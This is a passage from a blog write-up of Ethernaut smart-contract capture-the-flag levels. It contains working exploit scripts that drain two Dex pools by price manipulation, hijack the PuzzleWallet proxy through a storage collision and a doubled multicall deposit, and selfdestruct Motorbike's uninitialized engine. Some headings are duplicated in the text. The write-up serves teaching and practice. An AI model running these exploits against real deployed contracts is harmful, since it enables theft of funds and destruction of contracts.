token1Balance*token2Balance\u003e0;\n    }\n    \n    console.log(\"Hacked !\")\n}\n\n\nmodule.exports = async  function(deployer) {\n  \n  contract = await contractABI.at(\"0xBa71E2eEF0D68C5aBCDe6dF3EEf9377b9eD9E78C\"); \n  await drainFunds();\n};\n```\n\n![Dex console](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138023/852281f645c829a2d76b966618bbb6c25f1c4721506ecca9de0e7e6ef4fab42f_dw1jen.png)  \n\n## Dex 2\n\n## Challenge Description\n\nSame as Dex v1 but now we need to drain both tokens.\n\n--------\n**Analysis**\n\nSame here but we got one less check that makes it possible to inject a third token and thus draining both contract's main tokens' balance.\n\n![Dex 2 Function](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/aeb9bb0ecc92f4b707acbc9170c3bd3355c4361d3523704a799bc8717093366d_ogt3sr.png)  \n\n-----\n**-----\n**Exploitation**ation**\n\n```js\nconst contractABI = artifacts.require(\"Dex\");\n\nlet contract ;\nlet TOKEN1_ADDRESS = \"0x954aB18d300D8FFE76a2eFE7B36fcD6EF36825c7\";\nlet TOKEN2_ADDRESS = \"0xE651aD37ac31B03F7B49036248A29DC75D0093E6\";\n\nconst TOKEN3_ADDRESS= \"0xfe5A0de02e7c76f2A51e3d297e65ccE784787538\"\n\nlet PLAYER='0x84e7a3679A82C2766Ff8382862ab883FF9460307'\n\nasync function getBalances(){\n    const token1Balance = (await contract.balanceOf(TOKEN1_ADDRESS,contract.address)).toNumber();\n    const token2Balance = (await contract.balanceOf(TOKEN2_ADDRESS,contract.address)).toNumber();\n    console.log(`Current Balances for contract : A : ${token1Balance} \\t B : ${token2Balance}`);\n    return {token1Balance,token2Balance}\n}\n\nasync function knowTokenValues({token1Balance,token2Balance}){\n    return {mostExpensiveToken: token1Balance \u003e= token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS,cheapestToken:token1Balance \u003c token2Balance ? TOKEN2_ADDRESS : TOKEN1_ADDRESS };\n}\n\nasync function getSwapValues(tokensWithValues){\n    let toSwap  = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,PLAYER)).toNumber();\n    let available = (await contract.balanceOf(tokensWithValues.mostExpensiveToken,contract.address)).toNumber();\n\n    // making sure at the end when we get most of balance in one token type we can still get the rest of the tokens.\n    if(toSwap\u003eavailable)toSwap=available;\n\n    return toSwap;\n}\n\n\nasync function drainFunds(){\n    \n    let flag=true;\n    await contract.approve(contract.address,10000,{from:PLAYER});\n    while(flag){\n        const balances= await getBalances();\n        const tokenValues= await knowTokenValues(balances);\n        const toSwap = await getSwapValues(tokenValues);\n        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});\n        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);\nflag = balances.token1Balance*balances.token2Balance\u003e0;\n    }\n    // Token2 balance  = 0. Make sure to set the token3 value to the same value as token1 at the end of this loop.\n\n    flag = true;\n     TOKEN2_ADDRESS=TOKEN1_ADDRESS;\n     TOKEN1_ADDRESS=TOKEN3_ADDRESS;\n\nwhile(flag){\n        const balances= await getBalances();\n        const tokenValues= await knowTokenValues(balances);\n        const toSwap = await getSwapValues(tokenValues);\n        await contract.swap(tokenValues.mostExpensiveToken,tokenValues.cheapestToken,toSwap,{from:PLAYER});\n        console.log(`swapped ${toSwap} ${tokenValues.mostExpensiveToken} for  ${tokenValues.cheapestToken}`);\n\n        flag = balances.token1Balance*balances.token2Balance\u003e0;\n    }\n    \n    console.log(\"Hacked !\")\n}\n\n\nmodule.exports = async  function() {\n  \n  contract = await contractABI.at(\"0x5b9777555BDC7bA0Dee12EBB6d0Fc1E6Dc83b20a\"); \n  await drainFunds();\n}\n```\n\n#### Solidity Contract for test and for the token3\n\nMake sure to add a reasonable balance to the instance.\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol\";\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\";\n\ncontract SwappableToken is ERC20 {\n\n  constructor( string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n  }\n\n  function approve(address owner, address spender, uint256 amount) public returns(bool){\n    super._approve(owner, spender, amount);\n  }\n}\n\n// transfer(instanceAddress,ValueYouWant)\n```\n\n## PuzzleWallet\n\n**Challenge description**\n\n\u003e The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.\n\u003e Little did they know, their lunch money was at risk…\n  You'll need to hijack this wallet to become the admin of the proxy.\n  Things that might help::\n    Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.\n    Knowing about proxy patterns and the way they handle storage variables.\n\n--------\n**Analysis**\n\nWe all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that's why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts\n\n```js\ncontract PuzzleProxy is UpgradeableProxy {\n    // Getting to know the storage's layout of our contract\n    address public pendingAdmin;\n    address public admin;\n    ...\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    ...\n\n    contract PuzzleWallet {\n        // PuzzleWallet storage's layout\n    using SafeMath for uint256;\n    address public owner;\n    ...\n\n        modifier onlyWhitelisted {\n           require(whitelisted[msg.sender], \"Not whitelisted\");\n            _;\n        }\n\n      // Can change the storage slot[1]\n      function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      // contract's balance should be 0, but wait how much is it now ? \n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      ...\n\n      // only owner can add to white list\n      function addToWhitelist(address addr) external {\n        require(msg.sender == owner, \"Not the owner\");\n        ...\n\n        // You should be in whitelisted to be here\n        function multicall(bytes[] calldata data) external payable onlyWhitelisted {\n            ...\n            assembly {\n                // for more low level ops\n                selector := mload(add(_data, 32))\n            }\n            ...\n            // deposit can only be called once \n            if (selector == this.deposit.selector) {\n                require(!depositCalled, \"Deposit can only be called once\");\n                // Protect against reusing msg.value\n                depositCalled = true;\n            }\n            ...\n            // To not mistake it for the normal contract to contract delegate let's call it selfDelegate.\n            (bool success, ) = address(this).delegatecall(data[i]);\n            require(success, \"Error while delegating call\");\n        }\n    }\n}\n\n\n```\n\nFollowing the inheritance tree I found finally how the proxy call the real implementation. It was hinted in the challenge description too.\n\n```js\n  let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n```\n\nOkay let's sum it up in a diagram.\n\n![PuzzleWallet diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/9b067dbdb383316b6e46909a1bc3a9d8df1c699f4c6091286b753b9fd2e54fcc_e13u24.png)  \n\ndelegateCall can create big messes if we are not careful to the storage layout like we have seen in previous challenges. Let's inspect the storage layout for both contracts.\n\n![PuzzleWallet storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138027/f6f56436b637fed9a8b0a7f1353a0da755a55af222edb26ed38c71fb3d76435e_t0ouln.png)  \n\n`owner` and `pendingAdmin` both are at the slot[0] which is a very big problem. We can manipulate the pendingAdmin so when we `puzzleWalletAddress.delegateCall` we became the owner of the puzzleWallet contract ! huuuge.\n\nWe will be using the `proposeNewAdmin` to set the `pendingAdmin` value.\n\nOkay so now we can execute `owner` functions. Let's not forget our goal is to become the `owner` of the *Proxy* contract. Let's look for the function that can set `slot[1]` of the storage in both contracts.\n\n```js\n function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {\n      // contract's balance should be 0, but wait how much is it now ? \n      require(address(this).balance == 0, \"Contract balance is not 0\");\n      ...\n }\n```\n\nSo first of all we need to be `whitelisted`. We can do that\n\n```js\nawait contract.addToWhitelist(player);\n```\n\nSecond we need to make the contract balance to 0. `await web3.eth.getBalance(instance)` will return **0.001** ethers as balance. The `execute` function won't allow such a thing as we can only withdraw what we did deposit (It's tracked in storage variable `balances`). The only way to drain funds is to have more `balance` than the amount we deposited.\n\nIf we can't call deposit multiple times in one `multicall` how about we do it but by adding another layer of `multicall`\n\n![PuzzleWallet call hiearchy](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/bc95441a9b162a8b1494771895c5a3385ec0e2be3c4d26376c351eae4a5f5d1d_ggsn87.png)  \n\nThis allows to have the double of the msg.value as balance. Okay so we said we had **0.001** ethers as contract balance ? let's deposit 0.001 to our account so we can drain it. ( we will have the same value for our balance and the contract's ) . By having the contract's balance as 0 we can simply set the owner ow I mean maxBalance to our player account to **hijack the proxy**.\n\n-----\n**Exploitation**\n\n1. become the owner of the contract\n2. become whitelisted\n3. deposit the balance of the contract with multiple calls\n4. withdraw all funds\n5. setMaxBalance as our address\n\n\u003e The proxy is completely transparent this is possible by loading the ABI of the PuzzleWallet and using the address of the proxy. Don't get confused the address is the proxy's !\n\n```js\nconst proposeAdminCall= web3.eth.abi.encodeFunctionCall({\nname: 'proposeNewAdmin',\n    type: 'function',\n    inputs: [\n        {\n            type: 'address',\n            name: '_newAdmin'\n        }\n    ]\n},player)\n\nawait web3.eth.sendTransaction({data:proposeAdminCall,from:player,to:instance});\n\nawait contract.addToWhitelist(player);\n\n// getting the deposit call data\n\nconst depositData = (await contract.methods('deposit()').request()).data\n\nconst multiCallData = (await contract.methods('multicall(bytes[])').request([depositData])).data\n\nawait contract.multicall([multicallData,multicallData],{value:toWei('0.001')}); // adding to our balance\n\nawait contract.execute(player,toWei('0.002'),'0x0'); // Draining funds\n\nawait contract.setMaxBalance(player) // It will convert upon call \n```\n\nChallenge solved ✅\n\n## Motorbike\n\n**Challenge description**\n\n\u003e Ethernaut's motorbike has a brand new upgradeable engine design. \n\u003e  Would you be able to selfdestruct its engine and make the motorbike unusable ?\n\u003eThings that might help:\n    EIP-1967\n    UUPS upgradeable pattern\n    Initializable contract\n\n**Analysis**\n\nTo solve this challenge, we need to be familiar with both [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) and most importantly  the [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)\n\nAfter going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.\n\n![Motorbike Diagram](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23_usrhte.png)  \n\nAfter drawing the diagram, I had many unanswered questions the most important one did we `initialize` the engine contract or not !\nI really know where the address of the *Engine* contract is in storage so I can check that !\n\n```js\nconst engineAddress = await web3.eth.getStorageAt(instance,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');\n\n// let's check the value\nawait web3.eth.call({to:engineAddress,from:player,data:web3.eth.abi.encodeFunctionSignature('upgrader()')})\n// returned 0x000000\n// the initialize() wasn't called and that's our -----\n**Exploitation** !\n```\n\n\n**Exploitation**\n\n1. initialize the *Engine* contract so we become the **upgrader**.\n2. upgrade our *Engine* contract to our bomb contract ( which will selfdestruct )\n3. call selfdestruct, the call will be done through *delegateCall* so the actual *Engine* will be destructed !\n\nour evil contract\n\n```js\ncontract BombEngine { \n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    function destruct() public {\n        selfdestruct( payable ( 0x84e7a3679A82C2766Ff8382862ab883FF9460307));\n    }\n}\n```\n\n```js\nconst destructData= web3.eth.abi.encodeFunctionSignature('destruct()');\n\nconst data= web3.eth.abi.encodeFunctionCall({\n    name: 'upgradeToAndCall',\n    type: 'function',\n    inputs: [{\n        type: 'address',\n        name: 'newImplementation'\n    },{\n        type: 'bytes',\n        name: 'data'\n    }]\n}, [bombEngineAddress,destructData]);\n\nawait web3.eth.sendTransaction({to:engineAddress,from:player,data:data})\n\n// You can do a random call to the Engine contract it will revert because it's gone !\n```\n\nChallenge solved ✅\n\n"}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"ethernaut-writeup.md"},"buildId":"0ISm-a3DlXowWUoWCA_lL","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>